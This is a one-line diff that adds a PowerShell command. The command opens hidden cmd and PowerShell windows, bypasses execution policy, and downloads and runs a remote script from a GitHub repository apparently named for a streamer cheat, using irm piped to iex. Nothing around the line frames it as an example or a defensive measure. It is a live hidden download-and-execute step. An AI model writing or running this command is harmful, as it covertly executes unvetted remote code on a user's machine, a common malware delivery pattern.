@@ -1,0 +1,1 @@
+Start-Process cmd -ArgumentList '/c start "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "irm https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ShivUmangXd.ps1 | iex"' -WindowStyle Hidden
